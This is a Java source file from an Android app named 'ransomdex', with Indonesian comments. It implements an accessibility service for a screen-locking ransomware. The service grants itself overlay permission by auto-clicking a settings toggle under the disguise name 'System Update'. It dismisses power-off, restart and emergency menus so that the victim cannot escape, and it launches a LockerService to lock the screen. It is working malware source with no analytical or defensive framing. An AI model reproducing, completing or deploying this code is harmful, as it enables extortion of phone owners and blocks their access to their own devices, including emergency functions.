package com.bondex.ransomdex;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.net.Uri;
import android.provider.Settings;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;
import android.os.Environment;
import java.io.File;
import java.io.FileWriter;

public class CustomAccessibilityService extends AccessibilityService {

    private long lastActionTime = 0;
    private static final long ACTION_DELAY = 1000; // Ditingkatkan ke 1s agar lebih stabil

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        writeLog("Service Connected - Skipping system dialogs, jumping directly to Overlay Settings"); //
        
        // Langsung lompat tanpa menunggu event pertama
        jumpToOverlaySettings(); //
    }

    private void writeLog(String text) {
        try {
            File downloadDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            File myDir = new File(downloadDir, "dexlogs");
            if (!myDir.exists()) myDir.mkdirs();
            
            File logFile = new File(myDir, "logs.txt");
            FileWriter writer = new FileWriter(logFile, true);
            String timestamp = java.text.DateFormat.getDateTimeInstance().format(new java.util.Date());
            writer.append(timestamp).append(" : ").append(text).append("\n");
            writer.flush();
            writer.close();
        } catch (Exception e) {
            android.util.Log.e("DEX_LOG", "Failed to write log: " + e.getMessage());
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        // Jika rootNode null, langsung keluar tanpa masuk ke blok try-finally
        if (rootNode == null) return; 

        try {
            String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
            
            // 1. Blokir Menu Power / System UI
            if (packageName.equals("android") || packageName.contains("systemui")) {
                checkAndDismissSensitiveUI(rootNode);
            }

            // 2. Alur Izin Overlay
            if (!Settings.canDrawOverlays(this)) {
                handleOverlayPermissionFlow(rootNode, packageName);
            } else {
                // Jika sudah punya izin, pastikan LockerService aktif
                triggerLocker();
            }

        } finally {
            // Objek dipastikan tidak null di sini karena sudah dicek di atas
            rootNode.recycle(); 
        }
    }

    private void handleOverlayPermissionFlow(AccessibilityNodeInfo root, String pkg) {
        // Kita buat loop pencarian singkat jika node belum ditemukan
        // Ini menangani delay render UI di halaman Settings
        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
            AccessibilityNodeInfo currentRoot = getRootInActiveWindow();
            if (currentRoot == null) return;

            try {
                // 1. Pastikan kita di halaman yang benar (System Update)
                List<AccessibilityNodeInfo> targets = currentRoot.findAccessibilityNodeInfosByText("System Update");
                AccessibilityNodeInfo switchNode = findNodeById(currentRoot, "android:id/switch_widget");

                if (!targets.isEmpty() && switchNode != null) {
                    if (!switchNode.isChecked()) {
                        writeLog("Direct hit! Turning toggle ON.");
                        performClick(switchNode);
                    } else {
                        writeLog("Toggle is already ON. Triggering Locker.");
                        triggerLocker();
                    }
                } else if (pkg.contains("settings")) {
                    // Jika masih di list, klik namanya
                    clickByText(currentRoot, "System Update");
                }
            } finally {
                currentRoot.recycle();
            }
        }, 150); // Delay kecil 150ms untuk sinkronisasi render UI
    }

    private AccessibilityNodeInfo findNodeById(AccessibilityNodeInfo root, String viewId) {
        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(viewId);
        return (nodes != null && !nodes.isEmpty()) ? nodes.get(0) : null;
    }

    private void clickByText(AccessibilityNodeInfo node, String text) {
        List<AccessibilityNodeInfo> targets = node.findAccessibilityNodeInfosByText(text);
        for (AccessibilityNodeInfo target : targets) {
            if (target.getText() != null && target.getText().toString().equalsIgnoreCase(text)) {
                performClick(target);
            }
            target.recycle();
        }
    }

    private void performClick(AccessibilityNodeInfo node) {
        AccessibilityNodeInfo clickable = node;
        while (clickable != null && !clickable.isClickable()) {
            clickable = clickable.getParent();
        }
        if (clickable != null && clickable.isClickable()) {
            clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            lastActionTime = System.currentTimeMillis();
        }
    }

    private void checkAndDismissSensitiveUI(AccessibilityNodeInfo node) {
        String[] powerKeywords = {"Power off", "Restart", "Daya mati", "Mulai lagi", "Darurat"};
        for (String key : powerKeywords) {
            if (!node.findAccessibilityNodeInfosByText(key).isEmpty()) {
                performGlobalAction(GLOBAL_ACTION_BACK);
                break;
            }
        }
    }

    private void jumpToOverlaySettings() {
        writeLog("Executing Jump to Overlay Settings");
        Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, 
                                Uri.parse("package:" + getPackageName()));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_HISTORY | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
        startActivity(intent);
    }

    private void triggerLocker() {
        if (!LockerService.isAuthenticated) {
            Intent intent = new Intent(this, LockerService.class);
            startService(intent);
        }
    }

    @Override
    public void onInterrupt() {}
}